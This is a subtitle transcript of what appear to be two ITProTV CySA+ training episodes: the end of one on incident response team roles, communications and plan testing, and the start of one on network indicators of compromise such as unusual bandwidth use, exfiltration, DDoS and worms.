communication\nshould be done.\n\n323\n00:17:18.085 --> 00:17:19.575\nYeah, we tested it and it worked, great.\n\n324\n00:17:20.820 --> 00:17:21.890\nTwo years go by.\n\n325\n00:17:21.890 --> 00:17:24.430\nWe need to do that thing cuz\nan incident has occurred.\n\n326\n00:17:24.430 --> 00:17:25.580\nI've got to tell my supt stuff.\n\n327\n00:17:25.580 --> 00:17:27.730\nYeah, we've got that,\nhow do I do that again?\n\n328\n00:17:27.730 --> 00:17:29.640\nI don't know, don't remember.\n\n329\n00:17:29.640 --> 00:17:32.170\nSo documentation is very\nimportant when it comes to that,\n\n330\n00:17:32.170 --> 00:17:36.100\nwe will forget things like that as humans.\n&gt;&gt; And things change, right?\n\n331\n00:17:36.100 --> 00:17:40.180\nEmail addresses change,\nroles change within the organization.\n\n332\n00:17:40.180 --> 00:17:42.290\nAny number of things, so\nif it's a two year old policy,\n\n333\n00:17:42.290 --> 00:17:45.130\nit's a little bit better than\nnot having a policy at all but\n\n334\n00:17:45.130 --> 00:17:46.440\nnot much.\n&gt;&gt; Right.\n\n335\n00:17:46.440 --> 00:17:49.990\nSo make sure that you\nare testing these things.\n\n336\n00:17:49.990 --> 00:17:51.850\nRight?\nIt goes back to that testing.\n\n337\n00:17:51.850 --> 00:17:56.440\nHave a testing schedule to where we go,\nyou know what, let's simulate\n\n338\n00:17:56.440 --> 00:17:59.590\nan incident and make sure that all\nof our policies are up to date and\n\n339\n00:17:59.590 --> 00:18:02.560\nthey're doing the things they should do,\nall our lists are correct.\n\n340\n00:18:02.560 --> 00:18:04.540\nAll our stakeholders are on call.\n\n341\n00:18:04.540 --> 00:18:06.830\nAnd just make sure everything\nis going smoothly.\n\n342\n00:18:06.830 --> 00:18:12.880\nSo that if the real deal happens, we're\nnot going, I'm following the policy but\n\n343\n00:18:12.880 --> 00:18:16.010\nI'm emailing Mike or I'm calling his\nnumber and it says it is disconnected.\n\n344\n00:18:16.010 --> 00:18:17.720\nI don't understand.\n\n345\n00:18:17.720 --> 00:18:19.930\nWell, Mike got a new phone because\nhe dropped his in the toilet.\n\n346\n00:18:20.960 --> 00:18:21.650\nYeah, which is funny.\n\n347\n00:18:21.650 --> 00:18:24.030\nIt's like the number one reason\npeople lost their phones.\n\n348\n00:18:24.030 --> 00:18:25.600\nThey drop it in the toilet.\n\n349\n00:18:25.600 --> 00:18:26.113\nIt's weird.\n&gt;&gt; [LAUGH]\n\n350\n00:18:26.113 --> 00:18:27.263\n&gt;&gt; That's why I keep my phone in my front\n\n351\n00:18:27.263 --> 00:18:27.963\npocket.\n&gt;&gt; Yeah\n\n352\n00:18:27.963 --> 00:18:28.963\n&gt;&gt; But that's another story.\n\n353\n00:18:28.963 --> 00:18:29.860\n&gt;&gt; Yeah, that's another story.\n\n354\n00:18:29.860 --> 00:18:30.730\n&gt;&gt; But you know,\n\n355\n00:18:30.730 --> 00:18:32.150\ntesting this does many things, right?\n\n356\n00:18:32.150 --> 00:18:34.720\nNot only does it make sure\neverything is current and working,\n\n357\n00:18:34.720 --> 00:18:38.750\nit also gives the people a chance\nto kind of do a dry run through.\n\n358\n00:18:38.750 --> 00:18:42.550\nIf you don't really want\nan incident to be the first time\n\n359\n00:18:42.550 --> 00:18:44.620\nsomebody has had to implement this plan.\n\n360\n00:18:44.620 --> 00:18:48.980\nBecause during an incident, things\ntend to get a little crazy, decisions,\n\n361\n00:18:48.980 --> 00:18:54.240\nmaybe people aren't thinking as clearly\nand it's easy to get flustered.\n\n362\n00:18:54.240 --> 00:18:57.154\nBy testing it a couple of times,\npeople are a little more comfortable.\n\n363\n00:18:57.154 --> 00:18:58.003\nI know what to do.\n\n364\n00:18:58.003 --> 00:19:02.852\nI know exactly who I need to notify,\nhow I'm going to notify them and\n\n365\n00:19:02.852 --> 00:19:06.730\nit's a little bit easier on everybody.\n&gt;&gt; That's right,\n\n366\n00:19:06.730 --> 00:19:11.740\nthey say you'll default to\nyour level of expert training.\n\n367\n00:19:11.740 --> 00:19:14.324\nSo things that you have trained to much in\n\n368\n00:19:14.324 --> 00:19:16.899\nthat, you just go into auto mode.\n&gt;&gt; It's almost\n\n369\n00:19:16.899 --> 00:19:17.814\nsubconscious.\n&gt;&gt; Right,\n\n370\n00:19:17.814 --> 00:19:20.420\nit becomes just second nature to you.\n\n371\n00:19:20.420 --> 00:19:21.560\nTo be able to perform these tasks.\n\n372\n00:19:21.560 --> 00:19:26.100\nAnd the more you train to do that,\nthe more you test these policies out and\n\n373\n00:19:26.100 --> 00:19:28.570\ndo those dry runs, as Mike calls them.\n\n374\n00:19:28.570 --> 00:19:30.960\nThe better you'll react when\nthe actual real thing happens.\n\n375\n00:19:30.960 --> 00:19:35.890\nBecause that fight-or-flight response\ndoes affect us physiologically.\n\n376\n00:19:35.890 --> 00:19:37.870\nAnd it can cloud our judgment and\n\n377\n00:19:37.870 --> 00:19:41.300\nmake things move at different speeds and\nmake us feel like we're drowning.\n\n378\n00:19:41.300 --> 00:19:43.860\nWhen all you gotta do is slow down,\nif you know what to do.\n\n379\n00:19:43.860 --> 00:19:45.860\nYou know exactly how you need to react.\n\n380\n00:19:45.860 --> 00:19:49.780\nYou don't have to worry about your\nemotions getting the better of you.\n\n381\n00:19:49.780 --> 00:19:51.030\nYou just follow the plan.\n\n382\n00:19:51.030 --> 00:19:52.680\nYou know it will work.\n\n383\n00:19:52.680 --> 00:19:54.550\nAnd you respond accordingly.\n\n384\n00:19:54.550 --> 00:19:55.300\nAll right.\n\n385\n00:19:55.300 --> 00:19:58.000\nSo I think that's good enough for\nas far as the communications go.\n\n386\n00:19:58.000 --> 00:20:00.130\nJust make sure they're secure.\n\n387\n00:20:00.130 --> 00:20:00.970\nThat you've tested them.\n\n388\n00:20:00.970 --> 00:20:02.500\nThat everything works.\n\n389\n00:20:02.500 --> 00:20:03.510\nThat you follow policy.\n\n390\n00:20:04.840 --> 00:20:05.500\nAll right.\n\n391\n00:20:05.500 --> 00:20:06.770\nTechnical responsibilities.\n\n392\n00:20:06.770 --> 00:20:09.210\nThis kind of takes us\nback to our slide here.\n\n393\n00:20:09.210 --> 00:20:10.970\nWe have the different responsibilities.\n\n394\n00:20:10.970 --> 00:20:13.490\nHere we go.\nWe have technical management,\n\n395\n00:20:13.490 --> 00:20:16.270\nlaw enforcement and CSIRT provider.\n\n396\n00:20:16.270 --> 00:20:23.915\nSo, when responsibilities, just kind\nof who gets technical responsibilities?\n\n397\n00:20:23.915 --> 00:20:27.115\nWho gets management responsibilities?\n\n398\n00:20:27.115 --> 00:20:27.965\nAnd what are they?\n\n399\n00:20:27.965 --> 00:20:30.965\nWe kind of spoke about these things\nwhen we went through the different\n\n400\n00:20:30.965 --> 00:20:31.675\nstakeholders.\n\n401\n00:20:31.675 --> 00:20:35.055\nWe haven't spoken about technical\nresponsibilities because we haven't really\n\n402\n00:20:35.055 --> 00:20:36.875\ngot to that that but I say we do that now.\n\n403\n00:20:36.875 --> 00:20:40.870\nWhich are basically what\nare my responsibilities\n\n404\n00:20:40.870 --> 00:20:45.770\nas someone who's an IT worker, who's part\nof the incident response team, right?\n\n405\n00:20:45.770 --> 00:20:47.888\nI could just be a standard\nIT like we mentioned.\n\n406\n00:20:47.888 --> 00:20:51.730\nMaybe Mike just works on the help desk or\nhe's a level two tech.\n\n407\n00:20:51.730 --> 00:20:53.410\nBut he's not up there.\n\n408\n00:20:53.410 --> 00:20:55.980\nBut he does know kind of the ins and\nouts of the network.\n\n409\n00:20:55.980 --> 00:20:58.710\nSo he might be a good\nperson to have on the team.\n\n410\n00:20:58.710 --> 00:21:01.430\nRight, he kinda like,\nwell, that's abnormal.\n\n411\n00:21:01.430 --> 00:21:02.310\nHow's does he notice abnormal?\n\n412\n00:21:02.310 --> 00:21:03.890\nBecause he deals with it every day, so\n\n413\n00:21:03.890 --> 00:21:06.140\nhe might be just the right\nperson to be part of the team.\n\n414\n00:21:06.140 --> 00:21:10.050\nHe might not be a specialist,\nhe might not be an expert, right?\n\n415\n00:21:10.050 --> 00:21:12.330\nBut he is an expert in his field.\n\n416\n00:21:12.330 --> 00:21:16.920\nHe is an expert in the day-to-day\noperations of our network and\n\n417\n00:21:16.920 --> 00:21:17.670\nour environment.\n\n418\n00:21:17.670 --> 00:21:24.660\nSo, bringing him as someone that can help\nin the effort, could be a very good idea.\n\n419\n00:21:24.660 --> 00:21:27.300\nAnd he's able to perform\ntechnical aspects.\n\n420\n00:21:27.300 --> 00:21:31.430\nHey Mike, I need you to grab those\nlog files, he can do that, right?\n\n421\n00:21:31.430 --> 00:21:37.200\nI need you to be able to grab some emails,\nhe can do that, he has those abilities.\n\n422\n00:21:37.200 --> 00:21:40.423\nNot super specialized abilities but\nhe's a technical person.\n\n423\n00:21:40.423 --> 00:21:44.550\nSo, he is going to be able to work\nin the technical aspects, right?\n\n424\n00:21:44.550 --> 00:21:48.350\nYou do have specials,\nyou do have subject matter experts.\n\n425\n00:21:48.350 --> 00:21:51.256\nAnd maybe you have them in house,\nyou probably have a few.\n\n426\n00:21:51.256 --> 00:21:53.280\nThis will be things ike a DBA, right?\n\n427\n00:21:53.280 --> 00:21:57.950\nA database administrator is very\npointed in their field of expertise.\n\n428\n00:21:57.950 --> 00:21:59.460\nThey understand data bases.\n\n429\n00:21:59.460 --> 00:22:02.010\nMaybe you're running sequel, maybe\nyou're running some sort of no sequel,\n\n430\n00:22:02.010 --> 00:22:06.680\nwhatever the case is, if the attack\nwas against the sequel server,\n\n431\n00:22:06.680 --> 00:22:10.270\nthen you're gonna wanna go group your\nDBA and say, help us through this.\n\n432\n00:22:10.270 --> 00:22:14.960\nYou're gonna be a part of the team\nif the incident involves data bases.\n\n433\n00:22:14.960 --> 00:22:19.890\nSo we're gonna get your expert opinion,\nyour expert experience to bring that to\n\n434\n00:22:19.890 --> 00:22:25.180\nthe table, so that we can have a better\nidea of what's going on because Mike and\n\n435\n00:22:25.180 --> 00:22:27.140\nI, we don't deal with this.\n\n436\n00:22:27.140 --> 00:22:28.380\nSo we're gonna need you on our team.\n\n437\n00:22:28.380 --> 00:22:33.720\nSo don't be afraid to bring in specialist\neither from in-house or out of house, all\n\n438\n00:22:33.720 --> 00:22:37.360\nright, there will be plenty of people out\nthere that do this kinda work for hire.\n\n439\n00:22:37.360 --> 00:22:38.410\nBring them in.\n\n440\n00:22:38.410 --> 00:22:39.190\nBut what do you want to do?\n\n441\n00:22:39.190 --> 00:22:42.644\nYou want to put them on your list of\npeople to call in case a certain thing\n\n442\n00:22:42.644 --> 00:22:43.180\nhappens.\n\n443\n00:22:43.180 --> 00:22:46.610\nWhen we talk about our playbook,\nput all that stuff inside your playbook.\n\n444\n00:22:46.610 --> 00:22:49.940\nSo, SQL database has been compromised.\n\n445\n00:22:49.940 --> 00:22:51.910\nGrab the SQL playbook.\n\n446\n00:22:51.910 --> 00:22:54.340\nLet's call Joe.\n&gt;&gt; First line, call Joe.\n\n447\n00:22:54.340 --> 00:22:56.200\n&gt;&gt; Call Joe Smith, the DBA master,\n\n448\n00:22:56.200 --> 00:23:00.100\nwho's gonna come here and\nhelp walk us hold our little baby hands.\n\n449\n00:23:00.100 --> 00:23:03.830\nSo that we can walk through this\nin some modicum of success.\n\n450\n00:23:03.830 --> 00:23:06.230\nLet's see here.\n\n451\n00:23:07.670 --> 00:23:08.440\nWhat else do we want to go?\n\n452\n00:23:08.440 --> 00:23:09.900\nLet's just go ahead and\njump into management.\n\n453\n00:23:09.900 --> 00:23:14.440\nI think we've basically covered that\nrole but again, they'll speak with\n\n454\n00:23:14.440 --> 00:23:19.540\nlaw enforcement, they might speak with\nnews outlets, make official statements.\n\n455\n00:23:19.540 --> 00:23:21.770\nSo if something needs to be said like,\n\n456\n00:23:21.770 --> 00:23:25.610\nthere officially was a data\nbreach at XYZ Company.\n\n457\n00:23:25.610 --> 00:23:28.510\nAs the CEO of XYZ Company,\n\n458\n00:23:28.510 --> 00:23:32.020\nwe're here to tell you that your data\nis the most important thing to us and\n\n459\n00:23:32.020 --> 00:23:35.990\nsecurity is the top of the rung and\nblah blah blah blah blah and off they go.\n\n460\n00:23:35.990 --> 00:23:38.210\nThey're going to be able\nto do that kind of thing.\n\n461\n00:23:38.210 --> 00:23:39.025\n&gt;&gt; But it does,\n\n462\n00:23:39.025 --> 00:23:41.547\nit does have much more impact, I think,\n\n463\n00:23:41.547 --> 00:23:45.196\nto the public when it comes\nfrom a higher level executive.\n\n464\n00:23:45.196 --> 00:23:49.329\nMarketing PR might be the ones that are\npreparing that but it's delivered by that\n\n465\n00:23:49.329 --> 00:23:53.765\nperson that has some authority within the\norganization, so you feel like, at least,\n\n466\n00:23:53.765 --> 00:23:57.408\nthe idea is that he can back up what's\nhe's saying or she can back up what\n\n467\n00:23:57.408 --> 00:24:01.165\nthey're saying to the public.\n&gt;&gt; Yeah because we tend to get a bit of\n\n468\n00:24:01.165 --> 00:24:05.861\na jaundiced look at marketing and\nPR people, like they're spin doctors.\n\n469\n00:24:05.861 --> 00:24:09.617\nBut when the head of the company comes\nout, hey, you know it's serious You know\n\n470\n00:24:09.617 --> 00:24:13.621\nthat they're, they've been coached,\nmost likely in some way, shape, or form.\n\n471\n00:24:13.621 --> 00:24:16.329\nBut they're letting you know\nthe gravity of the incident.\n\n472\n00:24:16.329 --> 00:24:20.292\nAnd they're here to let you know that,\nyou trusted our company, we let you down,\n\n473\n00:24:20.292 --> 00:24:21.910\nwe're gonna make things right.\n\n474\n00:24:21.910 --> 00:24:25.972\nAnd there's a bit more weight to it\nthan just marketing guy, or God forbid,\n\n475\n00:24:25.972 --> 00:24:26.997\none of us techies.\n\n476\n00:24:26.997 --> 00:24:27.532\n[LAUGH]\n&gt;&gt; [LAUGH]\n\n477\n00:24:27.532 --> 00:24:28.677\n&gt;&gt; Thrown at you, that could\n\n478\n00:24:28.677 --> 00:24:31.470\nbe a nightmare come true, [LAUGH].\n&gt;&gt; You don't wanna put guys like us in\n\n479\n00:24:31.470 --> 00:24:33.198\nfront of the camera,\nthat would be a mistake.\n\n480\n00:24:33.198 --> 00:24:34.998\n&gt;&gt; Yeah, that'd be a bad idea.\n\n481\n00:24:34.998 --> 00:24:35.867\n&gt;&gt; [LAUGH]\n\n482\n00:24:35.867 --> 00:24:36.964\n&gt;&gt; I'll wait.\n\n483\n00:24:36.964 --> 00:24:38.413\n&gt;&gt; Wait a second.\n\n484\n00:24:38.413 --> 00:24:39.463\n&gt;&gt; All right, what else?\n\n485\n00:24:39.463 --> 00:24:43.765\nAgain, decision makers, they're okayers,\nright, they're the ones that\n\n486\n00:24:43.765 --> 00:24:47.620\ncan say I authorize you to turn off\ncritical infrastructure, right?\n\n487\n00:24:47.620 --> 00:24:51.168\nAgain, we're advising them, we need to\nturn this critical infrastructure off.\n\n488\n00:24:51.168 --> 00:24:54.898\nBut they need to be the ones that say,\nyes, go ahead and do that.\n\n489\n00:24:54.898 --> 00:24:57.693\nIf you feel that that's the right move,\nI give you authorization to do that,\n\n490\n00:24:57.693 --> 00:24:58.470\nthe authorization.\n\n491\n00:24:58.470 --> 00:25:01.644\nManagement typically is\ndoing that type of thing.\n\n492\n00:25:01.644 --> 00:25:05.301\nLaw enforcement,\nwhat are their responsibilities?\n\n493\n00:25:05.301 --> 00:25:07.666\nWell, if it's-\n&gt;&gt; I'm gonna say enforcing the law.\n\n494\n00:25:07.666 --> 00:25:08.919\n&gt;&gt; Yeah, it's weird,\n\n495\n00:25:08.919 --> 00:25:11.124\nnever thought about that.\n&gt;&gt; [LAUGH]\n\n496\n00:25:11.124 --> 00:25:12.108\n&gt;&gt; I think he's onto something.\n\n497\n00:25:12.108 --> 00:25:13.698\n[LAUGH] Right there, right?\n\n498\n00:25:13.698 --> 00:25:15.727\nHe's absolutely right actually,\n\n499\n00:25:15.727 --> 00:25:19.047\nthere has been some criminal\nactivity that has happened.\n\n500\n00:25:19.047 --> 00:25:22.083\nAnd now, it's weird,\nthe law seems to be weird.\n\n501\n00:25:22.083 --> 00:25:27.043\nThere is some activities, while criminal,\nif I don't decide to prosecute this, they\n\n502\n00:25:27.043 --> 00:25:32.017\nare perpetuated against me, there are some\nlaws I can decide not to prosecute, right.\n\n503\n00:25:32.017 --> 00:25:37.705\nThat the law enforcement will need my\nokay before they would be able to act.\n\n504\n00:25:37.705 --> 00:25:42.104\nThen there are some laws where they don't\nneed anybody's permission that are on\n\n505\n00:25:42.104 --> 00:25:42.758\nthe books.\n\n506\n00:25:42.758 --> 00:25:45.719\nLike if I killed Mike,\n[LAUGH] they would be able to come and\n\n507\n00:25:45.719 --> 00:25:48.619\nsay well,\nI don't think Mike's gonna prosecute you,\n\n508\n00:25:48.619 --> 00:25:52.402\nhe's kinda laying there not doing\na whole lot of much right now, right?\n\n509\n00:25:52.402 --> 00:25:56.567\nIt doesn't matter, there's been\na specific level of crime that occurs and\n\n510\n00:25:56.567 --> 00:25:58.465\nwe see the same thing inside of IT.\n\n511\n00:25:58.465 --> 00:26:01.385\nSometimes there are specific\nlevels of crime that have\n\n512\n00:26:01.385 --> 00:26:04.377\noccurred where law enforcement\nmust become involved.\n\n513\n00:26:04.377 --> 00:26:06.640\nAnd when they do, well,\nwhat are they gonna do?\n\n514\n00:26:06.640 --> 00:26:09.955\nThey're probably gonna have their CSIRT\nof their own that's gonna come in their\n\n515\n00:26:09.955 --> 00:26:11.426\ngonna do their digital forensics.\n\n516\n00:26:11.426 --> 00:26:13.963\nThey're gonna have their own team and\n\n517\n00:26:13.963 --> 00:26:17.664\nwe might work with them, we might not.\n&gt;&gt; They might tell us to get out of\n\n518\n00:26:17.664 --> 00:26:18.628\nthe way.\n&gt;&gt; They might say,\n\n519\n00:26:18.628 --> 00:26:21.754\nthere's your little seat right over there,\nwhy don't you go have it and\n\n520\n00:26:21.754 --> 00:26:24.805\nwe'll get with you when we're done.\n&gt;&gt; But this is where legal comes back into\n\n521\n00:26:24.805 --> 00:26:25.698\nplay, right?\n&gt;&gt; Right.\n\n522\n00:26:25.698 --> 00:26:27.330\n&gt;&gt; Having those different people on our\n\n523\n00:26:27.330 --> 00:26:30.283\nteam, knowing when it is that we\nhave to contact law enforcement.\n\n524\n00:26:30.283 --> 00:26:32.708\n&gt;&gt; Exactly, and when you do,\n\n525\n00:26:32.708 --> 00:26:36.826\nyou want to be as amicable\nto them as possible.\n\n526\n00:26:36.826 --> 00:26:40.170\nIf they are kind of, if you feel like if\nyou're getting toast up a little bit,\n\n527\n00:26:40.170 --> 00:26:42.897\nyou got that legal team and\ngo what can we do even though they've\n\n528\n00:26:42.897 --> 00:26:45.229\ntold us that they've taken\nover the investigation.\n\n529\n00:26:45.229 --> 00:26:47.868\nIs there anyway that we can\ncontinue our own investigation?\n\n530\n00:26:47.868 --> 00:26:51.675\nI mean, this is or data that will depend.\n\n531\n00:26:51.675 --> 00:26:57.225\nAgain, once you put legal on that,\nlet them advise you and see.\n\n532\n00:26:57.225 --> 00:27:00.210\nAnd then, CSIRT provider, you know what,\n\n533\n00:27:00.210 --> 00:27:04.092\nmaybe you guys aren't big enough or\nhave the expertise.\n\n534\n00:27:04.092 --> 00:27:08.201\nOr it's so devastating that you\njust wanna bring in the pros.\n\n535\n00:27:08.201 --> 00:27:12.602\nAnd girls that do this day in and\nday out, they're hired guns.\n\n536\n00:27:12.602 --> 00:27:17.449\nBring in a pro CSIRT team, let them,\neven though that's a little redundant\n\n537\n00:27:17.449 --> 00:27:18.092\n[LAUGH].\n&gt;&gt; [LAUGH]\n\n538\n00:27:18.092 --> 00:27:19.800\n&gt;&gt; Let them handle the thing,\n\n539\n00:27:19.800 --> 00:27:21.514\nyou put your trust in them.\n\n540\n00:27:21.514 --> 00:27:26.091\nHave that provider's number on\nthe refrigerator next to the phone\n\n541\n00:27:26.091 --> 00:27:30.178\nin case of emergency call CSIRT provider.\n&gt;&gt; So there's definitely advantages to\n\n542\n00:27:30.178 --> 00:27:31.477\nthat, right?\n&gt;&gt; There are.\n\n543\n00:27:31.477 --> 00:27:33.771\n&gt;&gt; How many incidents do you have a year?\n\n544\n00:27:33.771 --> 00:27:36.995\nI gotta keep these people on staff\nwhen I don't need them every day, and\n\n545\n00:27:36.995 --> 00:27:40.189\nas a small organization,\nthat could really affect your bottom line.\n\n546\n00:27:40.189 --> 00:27:43.785\nNot to mention, if you're hiring\nsomebody external, got experience,\n\n547\n00:27:43.785 --> 00:27:46.400\nthey've probably done this before.\n&gt;&gt; Let's hope so.\n\n548\n00:27:46.400 --> 00:27:47.454\n[LAUGH]\n&gt;&gt; Yeah, right,\n\n549\n00:27:47.454 --> 00:27:50.006\nyou hire the right people will find\nthat they've done this before and\n\n550\n00:27:50.006 --> 00:27:51.242\nthat might give us some comfort.\n\n551\n00:27:51.242 --> 00:27:55.031\nAnd now I don't have to train people up,\nkeep retraining them.\n\n552\n00:27:55.031 --> 00:27:58.760\nI'm a small organization, I can't afford\nto keep that many people on staff and\n\n553\n00:27:58.760 --> 00:27:59.962\ntrain.\n&gt;&gt; Exactly, exactly.\n\n554\n00:27:59.962 --> 00:28:04.047\nAnd that comes down to one of the\nnegatives of having to hire outside help.\n\n555\n00:28:04.047 --> 00:28:06.031\nWhich is it can cost you\na little bit of money, right.\n\n556\n00:28:06.031 --> 00:28:11.481\nBut that might be a small price to\npay to be honest with you, to regain\n\n557\n00:28:11.481 --> 00:28:15.249\nyour user bases confidence in your system.\n&gt;&gt; And\n\n558\n00:28:15.249 --> 00:28:19.591\nthey don't know the organization or\nthe equipment and network as well,\n\n559\n00:28:19.591 --> 00:28:23.169\nas maybe the in and out chainwood.\n&gt;&gt; Right, and if that is the case,\n\n560\n00:28:23.169 --> 00:28:26.238\nmake sure you always have some\nprocedures and some guidelines for\n\n561\n00:28:26.238 --> 00:28:29.391\nthem to be able to understand how\nthe normal everyday thing works.\n\n562\n00:28:29.391 --> 00:28:34.023\nHeck, us as the IT staff might\nwork as their subordinates, right.\n\n563\n00:28:34.023 --> 00:28:38.643\nAnd they call us, they bring us in as\ntechnical responsibilities and say hey,\n\n564\n00:28:38.643 --> 00:28:40.393\ncan you help me out with this?\n\n565\n00:28:40.393 --> 00:28:42.857\nI need to be able to get here,\nhere, and here,\n\n566\n00:28:42.857 --> 00:28:44.770\nyou show me the best path to do that.\n\n567\n00:28:44.770 --> 00:28:48.927\nThat could definitely be a hands\non approach, working side by side\n\n568\n00:28:48.927 --> 00:28:54.144\nsynergistically to make your incident\na little less painful, hopefully anyway.\n\n569\n00:28:54.144 --> 00:28:57.747\nThat's all I got for CSIRT roles and\nbuilding out that CSIRT.\n\n570\n00:28:57.747 --> 00:29:03.125\nAnd the communications that we use to,\nwell communicate with each other and\n\n571\n00:29:03.125 --> 00:29:06.662\na sound,\na good way to keep secret things secret.\n\n572\n00:29:06.662 --> 00:29:09.039\n[LAUGH]\n&gt;&gt; [LAUGH] All right, Daniel,\n\n573\n00:29:09.039 --> 00:29:12.200\ngreat explanation there of\nwhat makes a CSIRT team and\n\n574\n00:29:12.200 --> 00:29:16.433\nwhat our different roles and\nresponsibilities are within that CSIRT.\n\n575\n00:29:16.433 --> 00:29:19.603\nSo we appreciate that, hope everybody\nout there enjoyed watching this one.\n\n576\n00:29:19.603 --> 00:29:22.367\nSigning off for ITProTV,\nI've

00:00:08.133\n[MUSIC]\n\n4\n00:00:08.133 --> 00:00:12.557\n&gt;&gt; You're watching ITPro.TV.\n&gt;&gt; Hello,\n\n5\n00:00:12.557 --> 00:00:15.735\nwelcome to another exciting\nepisode here at ITPro.TV.\n\n6\n00:00:15.735 --> 00:00:20.002\nI'm your host Mike Rodrick,\nthey were doing our CYSA plus.\n\n7\n00:00:20.002 --> 00:00:21.011\nIn this episode,\n\n8\n00:00:21.011 --> 00:00:25.802\nwe'll be taking a look at indicators of\ncompromise dealing with network symptoms.\n\n9\n00:00:25.802 --> 00:00:27.596\nAnd here to help us with\nthat is none other than Mr.\n\n10\n00:00:27.596 --> 00:00:29.822\nDaniel Lowrie, welcome Daniel.\n&gt;&gt; Hey Mike, how's it going today?\n\n11\n00:00:29.822 --> 00:00:31.711\nGlad to be back on the show.\n&gt;&gt; Yeah.\n\n12\n00:00:31.711 --> 00:00:33.172\n&gt;&gt; And how are you good folks out there?\n\n13\n00:00:33.172 --> 00:00:36.798\nWe'll be having a great day, cuz today\nwe are going to look at Indicators\n\n14\n00:00:36.798 --> 00:00:40.374\nof compromise, specifically,\nnetwork indications of compromise.\n\n15\n00:00:40.374 --> 00:00:42.751\nWe will also have another\nshow on the host or\n\n16\n00:00:42.751 --> 00:00:47.462\napplications that are in the host that you\nmight, symptoms that occur within them.\n\n17\n00:00:47.462 --> 00:00:50.807\nBut today, we're gonna focus in\non that network side of things.\n\n18\n00:00:50.807 --> 00:00:53.551\nSo that when you go,\nsomething seems weird,\n\n19\n00:00:53.551 --> 00:00:56.307\nmaybe that's an indication of compromise.\n\n20\n00:00:56.307 --> 00:00:58.692\nSo that's what we're gonna\ntry to tackle today.\n\n21\n00:00:58.692 --> 00:00:59.664\n&gt;&gt; Awesome, all right,\n\n22\n00:00:59.664 --> 00:01:03.052\nwell where do we start cuz it does seem\nlike something very important, right?\n\n23\n00:01:03.052 --> 00:01:07.729\nI need to know as soon as possible if\nthere's something going on hinky as you\n\n24\n00:01:07.729 --> 00:01:09.936\nlike to say on our network.\n&gt;&gt; Yeah,\n\n25\n00:01:09.936 --> 00:01:12.247\nand it does typically starts with that.\n\n26\n00:01:12.247 --> 00:01:16.717\nYou just have an intuitive idea that\nthings don't seem to be working as\n\n27\n00:01:16.717 --> 00:01:17.642\nthey should.\n\n28\n00:01:17.642 --> 00:01:19.841\nNow, specifically we're\ntalking about networking.\n\n29\n00:01:19.841 --> 00:01:23.182\nSo you're dealing with the network,\nand you realize,\n\n30\n00:01:23.182 --> 00:01:25.179\nsomething is off in the network.\n\n31\n00:01:25.179 --> 00:01:29.963\nMaybe you're looking at some logs, or\nmaybe you're trying to transfer files.\n\n32\n00:01:29.963 --> 00:01:34.462\nAnd you notice that the net flow was\nshowing some interesting traffic.\n\n33\n00:01:34.462 --> 00:01:37.964\nThese are the kind of things that will\nlead you to believe that there might be\n\n34\n00:01:37.964 --> 00:01:40.967\nsome bad and nefarious thing\nhappening on the back side there and\n\n35\n00:01:40.967 --> 00:01:42.931\nyou wanna investigate a little further.\n\n36\n00:01:42.931 --> 00:01:45.750\nSo let's start off with\nbandwidth consumption.\n\n37\n00:01:45.750 --> 00:01:49.526\nThis is probably one of the more\ntypical indicators of compromise that\n\n38\n00:01:49.526 --> 00:01:53.952\nare happening on your network, at least\nthrough the network mean, should I say.\n\n39\n00:01:53.952 --> 00:01:56.927\nIt might be a host that's\nbeen compromised, but\n\n40\n00:01:56.927 --> 00:02:01.428\nit's utilizing the network in such\na way that it calls attention to itself\n\n41\n00:02:01.428 --> 00:02:03.545\nthrough bandwidth consumption.\n\n42\n00:02:03.545 --> 00:02:06.686\nThat happens a lot, because when\na machine becomes compromised,\n\n43\n00:02:06.686 --> 00:02:09.890\nmost of the time what we're talking\nabout here is malware, right.\n\n44\n00:02:09.890 --> 00:02:17.022\nThat is probably 90% of what we\nmean by something is compromised.\n\n45\n00:02:17.022 --> 00:02:22.151\nIt has been installed with some form of\nmalware and that malware is now creating\n\n46\n00:02:22.151 --> 00:02:27.375\nconnections, doing download, excel\ntrading data, all these things occur.\n\n47\n00:02:27.375 --> 00:02:28.327\nAnd typically,\n\n48\n00:02:28.327 --> 00:02:32.952\nwhen it does that, it's gonna soak up a\nlot of network bandwidth when it does it.\n\n49\n00:02:32.952 --> 00:02:36.663\nCuz it doesn't care, all it cares about is\ngetting the data from point A to point B.\n\n50\n00:02:36.663 --> 00:02:37.663\nSo that they can,\n\n51\n00:02:37.663 --> 00:02:41.343\nwhoever has done this can do whatever\nthey want to with that data.\n\n52\n00:02:41.343 --> 00:02:46.162\nMaybe sell it, or they're working for\na competitor, who knows why, or\n\n53\n00:02:46.162 --> 00:02:47.744\nthe reasons behind it.\n\n54\n00:02:47.744 --> 00:02:51.480\nBut it typically will eat up some\nbandwidth when this happens.\n\n55\n00:02:51.480 --> 00:02:53.940\nSo we talked about some\npossible causes of this,\n\n56\n00:02:53.940 --> 00:02:58.152\nthat they're ex-filtrating data out from\nthe system that has been compromised.\n\n57\n00:02:58.152 --> 00:03:01.891\nCould also be a distributed\ndenial of service attack,\n\n58\n00:03:01.891 --> 00:03:05.560\nthat will also eat up a bit of bandwidth,\nwhy is that?\n\n59\n00:03:05.560 --> 00:03:09.471\nWell, if you think about distributed\ndenial services, what happens?\n\n60\n00:03:09.471 --> 00:03:15.226\nIt is network traffic coming in\nthrough the form of some request or\n\n61\n00:03:15.226 --> 00:03:20.038\nsending packet data into\nthe system itself, so much so\n\n62\n00:03:20.038 --> 00:03:22.878\nthat it's unable to handle it.\n\n63\n00:03:22.878 --> 00:03:25.732\nSo they're just gonna soak up that\nbandwidth by sending those requests.\n\n64\n00:03:25.732 --> 00:03:26.488\n&gt;&gt; And worms,\n\n65\n00:03:26.488 --> 00:03:31.331\nI know something that it seems like we\ndon't see as much of them anymore, but\n\n66\n00:03:31.331 --> 00:03:32.010\nworms.\n\n67\n00:03:32.010 --> 00:03:36.771\nI remember when a company I worked for\ngot infected with SQL Slammer.\n\n68\n00:03:36.771 --> 00:03:39.273\nAnd that thing,\njust the replication traffic,\n\n69\n00:03:39.273 --> 00:03:43.180\nthe act of that replicating other\nmachines generated a tremendous amount,\n\n70\n00:03:43.180 --> 00:03:45.693\nbasically shut our network down.\n&gt;&gt; Yeah.\n\n71\n00:03:45.693 --> 00:03:48.180\n&gt;&gt; So another reason you see band with\n\n72\n00:03:48.180 --> 00:03:51.453\nconsumption.\n&gt;&gt; Great example of that, that 